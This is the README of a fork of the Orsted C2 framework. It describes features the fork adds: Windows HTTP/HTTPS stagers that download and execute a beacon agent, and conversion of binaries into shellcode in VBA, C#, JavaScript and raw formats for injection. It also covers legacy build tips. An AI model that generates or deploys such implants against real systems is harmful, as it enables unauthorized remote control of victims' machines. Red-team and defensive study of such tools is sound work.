# Orsted C2 — Feature Fork

![Orsted](orsted-homepage.png)

> **"They live as they please with that tiny pride of theirs and die because of a foolish enemy."**  

This is a fork of the original [Orsted C2](https://github.com/almounah/orsted) framework, focused on implementing missing features and fixes. The original project provides the core C2 architecture — this repo extends it with stager delivery, shellcode generation, and related improvements.

**Original repo:** [github.com/almounah/orsted](https://github.com/almounah/orsted)  
**Original docs:** [almounah.github.io/orsted-doc](https://almounah.github.io/orsted-doc/)

---

## Features Added in This Fork

### Two-Stage Stager Delivery

Generate minimal stagers (~50KB) that register with the C2 server, download the full beacon agent, and execute it. Supports both 32-bit and 64-bit Windows targets over HTTP and HTTPS.

**Generate a stager:**
```bash
# 64-bit HTTP stager
generate stager windows http 192.168.1.10:8080

# 32-bit HTTP stager
generate stager windows http 192.168.1.10:8080 -r 32

# 64-bit HTTPS stager
generate stager windows https 192.168.1.10:443

# 32-bit HTTPS stager with proxy
generate stager windows https 192.168.1.10:443 -r 32 -t https -a 127.0.0.1:8080
```

**Options:**
| Flag | Description | Default |
|------|-------------|---------|
| `-r, --arch` | Target architecture (`32` or `64`) | `64` |
| `-t, --http-proxy-type` | Proxy type (`http`, `https`) | `none` |
| `-a, --http-proxy-address` | Proxy address (`IP:PORT`) | — |
| `-u, --http-proxy-username` | Proxy username | — |
| `-p, --http-proxy-password` | Proxy password | — |

**Output files:**
- `stager_http_64.exe` — Windows x64 HTTP stager
- `stager_http_32.exe` — Windows x86 HTTP stager
- `stager_https_64.exe` — Windows x64 HTTPS stager
- `stager_https_32.exe` — Windows x86 HTTPS stager

**How it works:**
1. Stager registers with C2 server (same protocol as full beacon)
2. Constructs download URL from server address + beacon ID
3. Downloads full beacon binary from `/agent/download/{beacon_id}`
4. Validates PE header (MZ magic bytes)
5. Writes to temp file and executes via `os.StartProcess`
6. Stager exits, beacon continues running

**Server setup:** Place the compiled beacon at `beacons/main_http_64.exe` (or `main_http_32.exe`) in the server's working directory.

---

### Shellcode Generation

Convert any PE binary (stager or beacon) into position-independent shellcode using [donut](https://github.com/TheWover/donut). Supports multiple output formats for different injection scenarios.

**Usage:**
```bash
# Base64 output (default)
generate shellcode stager_http_64.exe

# Raw binary
generate shellcode stager_http_64.exe -f raw -o payload.bin

# C# byte array
generate shellcode stager_http_64.exe -f csharp -o payload.cs

# VBA array
generate shellcode stager_http_64.exe -f vba -o payload.vba

# JavaScript array
generate shellcode stager_http_64.exe -f javascript -o payload.js

# Hex string
generate shellcode stager_http_64.exe -f hex -o payload.hex
```

**Supported formats:** `base64`, `hex`, `raw`, `vba`, `csharp`, `javascript`

Works with both 32-bit and 64-bit PE files. The donut tool must be present at `tools/donut`.

---

### Bug Fixes

- Fixed `grumble.Commands` iteration error (struct is not iterable — use `.Get()`)
- Fixed missing `os` import in server download handler
- Fixed `os.StartProcess` return value handling
- Fixed stager dying instantly (removed premature temp file deletion)
- Fixed false success message on stager build failure

---

## Building for Older GLIBC/Legacy Systems

If your target systems have older GLIBC versions (< 2.32), beacons built on modern systems will fail with:
```
./main_http: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.32' not found
```

**Solution: Build inside a Docker container with matching GLIBC version.**

```bash
# Create builder
docker build -f Dockerfile.build -t orsted-builder:legacy .

# Run with volume mounts
docker run -it --rm \
  -v $(pwd):/data/orsted \
  -v $(pwd)/beacons:/data/output \
  orsted-builder:legacy
```

**GLIBC versions by Ubuntu:**
- Ubuntu 20.04 → GLIBC 2.31
- Ubuntu 18.04 → GLIBC 2.27
- Ubuntu 16.04 → GLIBC 2.23

---

## Original Documentation

For the core Orsted architecture, setup, and usage:

- **Original repo:** [github.com/almounah/orsted](https://github.com/almounah/orsted)
- **Documentation site:** [almounah.github.io/orsted-doc](https://almounah.github.io/orsted-doc/)
- **Example usage:** [Orsted in Action](https://almounah.github.io/orsted-doc/intro/4-example-usage/)

![Orsted](orsted.gif)
